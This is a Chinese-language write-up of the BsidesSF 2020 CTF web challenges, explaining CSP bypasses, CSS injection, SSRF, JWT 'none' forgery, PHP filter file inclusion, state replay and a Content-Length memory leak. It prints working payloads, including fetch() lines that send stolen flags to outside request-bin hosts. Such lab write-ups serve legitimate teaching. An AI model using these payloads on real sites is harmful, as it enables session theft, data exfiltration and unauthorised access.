原创 唐龙 合天智汇

## 前言  

前两天玩了下BsidesSF 2020，本文记录了所有WEB题的解答。

## Writeup  

## csp-1  

前3道都是考察CSP绕过，直接来看CSP规则：

content-security-policy: script-src 'self' data:; default-src 'self'; connect-src *; report-uri /csp_report

src属性可以用data:，可以用来执行JS：

<script src=data:text/plain,alert(1)> <script
src=data:text/plain;base64,YWxlcnQoKQ==>

connect-src为*，可以用ajax外传数据。

获取flag的payload:

fetch('/csp-one-flag') .then( res => { return res.text() } ).then( body => {
fetch('//en8g3bmh1l494.x.pipedream.net/?' + btoa(body)) } )

第一题比较简单。

## csp-2  

CSP规则：

content-security-policy: script-src 'self' ajax.googleapis.com 'unsafe-eval';
default-src 'self' 'unsafe-inline'; connect-src *; report-uri /csp_report

script-src允许了ajax.googleapis.com，表示js可以从这里加载；unsafe-eval表示允许使用eval()等通过字符串创建代码的方法。 这个场景是典型的利用CDN上的旧JS框架来绕过CSP，也叫代码重用攻击。 可参考：

  * [A Wormable XSS on HackMD!](https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html)  

  * [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)   

利用最终的payload：

<script
src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script>
<div ng-app> {{constructor.constructor("fetch('/csp-two-flag').then(res=>{return
res.text()}).then(body=>{fetch('//ene9q890m5b39.x.pipedream.net//?'+body)})")()}}
</div>

## csp-3  

CSP规则：

content-security-policy: script-src 'self'
http://storage.googleapis.com/good.js; default-src 'self'; connect-src *;
report-uri /csp_report

从 robots.txt 可得知/redirect?url=<http://example.com>存在301跳转漏洞。

storage.googleapis.com是firebase存储文件的域名。我们可以先在firebase创建项目并上传文件，然后在<https://console.cloud.google.com/storage/browser/>{bucket}给文件添加一个叫”allUsers“的权限。就能获得一个任何人可访问的js：<http://storage.googleapis.com/>{bucket}/xss.js。

但是这个url的路径部分和CSP是不匹配的，得想办法绕过。

根据[CSP Level 3, 7.6. Paths and Redirects](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects)，跳转之后路径部分会被忽略。例如对于策略img-src example.com
example.org/path： 直接加载<https://example.org/not-path>将失败，因为它与策略不匹配。
加载<https://example.com/redirector>，由于它和example.com匹配，故能通过。 *
假设<https://example.com/redirector>重定向到<https://example.org/not-path>，也将通过。因为跳转前匹配上了example.com，跳转后匹配上了example.org（路径部分被忽略）。

利用这个特点，让/redirect跳转到<http://storage.googleapis.com/>{bucket}/xss.js，则策略中的/good.js将被忽略，从而绕过该CSP。

这里还有个细节，题目使用的是https，而CSP里写的是<http://storage.googleapis.com/good.js>是http，即使绕过了CSP，浏览器也不会允许从https降级请求http资源。

根据CSP3的文档，CSP规则的协议部分的匹配是不对称的，例如： https: 不能匹配 <http://example.com/> http: 可以匹配
http: 和 https:

所以，我们可以跳转到https上，也是可以过CSP的。

最终的payload：

<script src=/redirect?url=https://storage.googleapis.com/{bucket}/xss.js>

xss.js：

fetch('/csp-three-flag') .then( r => r.text() ).then( flag =>
fetch('//{HTTPLog}/' + flag) )

## fun-with-flags  

这道题只能插入<style>标签，插入其他标签会被实体化编码，显然是考察CSS注入。要获取的flag在：

<div> <input type="hidden" name="flag" value=Try reading this value> <p>End of
messages. </p> </div>

利用CSS选择器和background猜解flag，POC：

<style> input[name="flag"][value ^="C"] { background:
url('https://httplog/C'); } </style>

逐位猜解即可，脚本：

import string base = string.ascii_uppercase + string.ascii_lowercase +
string.digits + '!@#-_+=~{}[]' payload = "<style>" for char in base: # flag =
'CTF{Clandestine_Secret_Stealing}' flag = '' style = """
input[name="flag"][value ^="{char}"] { background:
url('https://httplog/{char}'); } """.replace('{char}', flag + char) payload +=
style payload += "</style>" print(payload)

## simple-todos  

此题使用了一套叫meteor的框架来构建了一个web应用。 由于开了debug，我们可以通过dev tools来检查源码。

![v2-08f2cd0501888e4bd1797aa6a3876217_720w](https://pic1.zhimg.com/80/v2-08f2cd0501888e4bd1797aa6a3876217_720w.png)

有意思的是，这个应用居然在客户端操作mongodb。
通过抓包发现，这并不是在客户端直接连接远端mongodb，而是通过websocket与server端通信，真正的数据库操作还是在server端实现的。不过，既然存在这种映射，也相当于我们可以直接操作数据库了。

flag在一个叫flag的**里：

![v2-a303e516043ef21ce440775560aa0c23_720w](https://pic2.zhimg.com/80/v2-a303e516043ef21ce440775560aa0c23_720w.png)

## recipe  

题目描述：

> I've found this recipe storage service. Rumor has it that the famous San
> Francisco-based Boudin Bakery is working on a new recipe. Can you get that
> for me?  
>

注册账号登录后，在网页源码内可以发现一个新的端点：/users。直接访问提示”Access only allowed from local
tools.Recipebot server at 0.0.0.0:8080“。

在/recipe/new端点可以提交一个url，这是一个下载远程图片的功能。这里存在SSRF，过滤了内网IP，但是0.0.0.0没有过滤。

通过SSRF请求<http://0.0.0.0:8080/users>，得到所有注册用户的用户名和一串id。

<li><a href='/profile/601097de-f144-4261-85a1-ee741bb17486'>lolno</a></li>
...... <li><a
href='/profile/6180f0c8-778b-442f-a5ab-10e18bef4c2d'>boudin_bakery</a></li>

根据题目描述，flag应该在boudin_bakery这个账号里。直接访问/profile/6180f0c8-778b-442f-a5ab-10e18bef4c2d提示404。

注意到cookie是jwt的形式：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODI2MDY3MDEsImlhdCI6MTU4MjYwMzEwMSwiaXNzIjoicmVjaXBlY**0IiwibmJmIjoxNTgyNjAzMTAxLCJzdWIiOiI3NTVlZGFjMi1kMmU4LTQyYWItOGIwNC0wOWIxNmU3M2YwM2YifQ.kHiGy6TshwFfoRrFI2FMIRweIx8n233JmTQfFMDZhFU

将header和payload部分base64解码（前两部分）

{ "alg": "HS256", "typ": "JWT" } { "exp": 1582606701, "iat": 1582603101,
"iss": "recipebot", "nbf": 1582603101, "sub":
"755edac2-d2e8-42ab-8b04-09b16e73f03f" }

解码payload部分时如果末尾没有}需要手动补齐=再解码。

各字段的意义： alg：token所用的签名算法 typ：token类型，JWT表示JSON Web Token exp：token过期时间
iat：token创建时间 iss：token的颁发者 nbf：token的生效时间 * sub：面向的用户

sub字段就是用户身份标识，也就是/users端点泄露出来的那些。 显然，我们要伪造cookie。jwt的第三部分是签名，签名是需要秘钥的。
这里加密算法用的HS256，签名和校验的秘钥相同。 所以要伪造cookie有2种方式： 爆破出签名的secret：[c-jwt-cracker26900112](https://github.com/brendan-rius/c-jwt-cracker)
修改算法为none，去掉签名（保留末尾的点号）

法2的原理： 一些jwt库中实现了none算法，这种情况下将不校验签名。

尝试将sub换成boudin_bakery的，修改alg为none，并去掉签名字段（要保留末尾的点号）。伪造cookie访问/recipes即可得到flag。

## had-a-bad-day  

题目描述：

> Can you read flag.php?  
>

端点：/index.php?category=woofers

容易测试出后端代码逻辑：

$cate = $_GET['category']; if (strpos($cate, "woofers") !== false) {
include($cate . '.php'); }

利用文件包含读取文件的常用payload：

php://filter/convert.base64-encode/resource=a.php
php://filter/read=convert.base64-encode/resource=a.php

这里考察的是如何绕过strpos($cate, "woofers")。

我发现了两种绕过方式： php://filter/read=convert.base64-encode/resource=meowers/../flag
php://filter/read=convert.base64-encode|meowers/resource=flag

第一种利用了PHP会对路径进行规范化处理；第二种利用了PHP对不存在过滤器的容错性，虽然会报warning，但是还是输出了结果。

## hurdles  

这题比较无聊，套娃题。 payload：

PUT /hurdles/!?get=flag&%26%3D%26%3D%26=%2500%0a HTTP/1.1 Host:
hurdles-0afa81d6.challenges.bsidessf.net origin: https://ctf.bsidessf.net
Accept: text/plain Accept-Language: ru Authorization: Basic
cGxheWVyOjU0ZWYzNmVjNzEyMDFmZGY5ZDE0MjNmZDI2Zjk3ZjZi User-Agent: 1337 Browser
v.9999 X-Forwarded-For: 13.37.13.37,127.0.0.1 Referer:
https://ctf.bsidessf.net/challenges Cookie: Fortune=6265 Content-Length: 0
Connection: close

只记录一个知识点： X-Forwarded-For: <client>, <proxy1>, <proxy2>
在客户端访问服务器的过程中，往往要经过多层代理。X-Forwarded-For用于记录客户端和各级代理的IP地址。
<client>表示客户端的IP；如果经过了多级代理，则每级代理的IP都会被记录在内，最右端是最后经过的代理。

## cards  

题目是一道21点游戏题。非常吃规则，不会玩的话基本做不了。

![v2-4091caef7f3d681342574da51c99027f_720w](https://pic3.zhimg.com/80/v2-4091caef7f3d681342574da51c99027f_720w.png)

每个请求都有个SecretState参数，用来保存游戏状态（可以看成是数据库），并且在客户端和服务端同步。但是这个参数没法篡改。

每次请求，服务端都会生成一个新的SecretState，但是旧的SecretState并不失效，问题就出在于此。

游戏如果赢了，就更新SecretState，如果输了，则不更新SecretState。这样就可以达到类似一种分数只增不减的效果。

但是有个问题，下注之后要开牌的话，必须得用新的SecretState，而下注的时候分数已经扣了，这样输的状态依然存在。

这就需要利用21点里一个规则，如果先发的2张牌已经是21点（black jack），则直接赢。这种状态下可以省去开牌那一步。

脚本：

import requests start = "https://cards-d38741c8.challenges.bsidessf.net/api"
deal = start + "/deal" proxy = {"https": "http://127.0.0.1:1087/"} # 开局 state
= requests.post(start, proxies=proxy).json()["SecretState"] while True: # 下注
try: resp = requests.post(deal, json={"Bet": 500, "SecretState": state},
proxies=proxy).json() except: continue if resp['GameState'] == 'Blackjack':
state = resp['SecretState'] print(resp['Balance']) if resp['Balance'] >
100000: print(resp) break

## bulls23  

题目给了一个pcapng流量包和一对IP地址：bulls23-df80135a.challenges.bsidessf.net:8888

分析流量包，将其中几个与题目相关的网页导出来

![v2-eb5daf71eb52f1caab9d744dac5dc4a8_720w](https://pic1.zhimg.com/80/v2-eb5daf71eb52f1caab9d744dac5dc4a8_720w.png)

在本地还原，

![v2-6485efe386f29dc0388311bfc1888e13_720w](https://pic2.zhimg.com/80/v2-6485efe386f29dc0388311bfc1888e13_720w.png)

这是一个web终端，要求输入账号密码，这肯定得从流量包里提取。

分析了下，账号密码通过websocket发到服务端，每次发一个字符，账号和密码之间隔着一个回车。

用websocket and tcp.dstport == 8888过滤出相关数据包。

![v2-7ca3c724df4f69e83282315ecb1ba31c_720w](https://pic3.zhimg.com/80/v2-7ca3c724df4f69e83282315ecb1ba31c_720w.png)

依次检查相邻的几个数据包，得到账号michaeljordan，密码ib3atm0nstar5。 登录即可得到flag。

## webbleed  

题目只支持POST方法，并输出POST的全部内容。

![v2-a9f69bee7c0bd6d60a8ec046000d8306_720w](https://pic3.zhimg.com/80/v2-a9f69bee7c0bd6d60a8ec046000d8306_720w.png)

题目叫webbleed，可能和经典的**滴血（HeartBleed）漏洞相关。 回顾下**滴血的原理：
客户端向服务端发送的心跳载荷长度大于实际发送的载荷长度，服务器会将内存中的额外数据返回给客户端，导致信息泄露。

在HTTP协议中，Content-Length头表示body部分的长度。我们来类比**滴血，测试下是否也存在相似问题。 POC:

echo -en 'POST / HTTP/1.1\nHost: webbleed-bfd4616e.challenges.bsidessf.net\nContent-Length: 3\n\n123' | nc -N webbleed-bfd4616e.challenges.bsidessf.net 8888 | hexdump -C

将Content-Length由3改成4（body部分只提交3字节数据）：

![v2-6b59da71fade52a68815d7c6c6a1770d_720w](https://pic1.zhimg.com/80/v2-6b59da71fade52a68815d7c6c6a1770d_720w.png)

可以发现，服务端多返回了一个字节的数据，说明存在漏洞。

把Content-Length给的大一点，读一大块内存出来，即可找到flag。

![v2-c5db0975544fdb7a16524e4b1f9bf51c_720w](https://pic4.zhimg.com/80/v2-c5db0975544fdb7a16524e4b1f9bf51c_720w.png)

复制链接做实验：openssl协议heartbleed漏洞分析：

<http://hetianlab.com/expc.do?ce=9947b0a0-6c83-4ae5-a571-f243f37d18a6>

![v2-63f65744f2928eeccc643a41481ea668_720w](https://pic1.zhimg.com/80/v2-63f65744f2928eeccc643a41481ea668_720w.png)

## 总结  

总的来说，题目质量中上，难度梯度合理，思路也比较灵活有趣。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

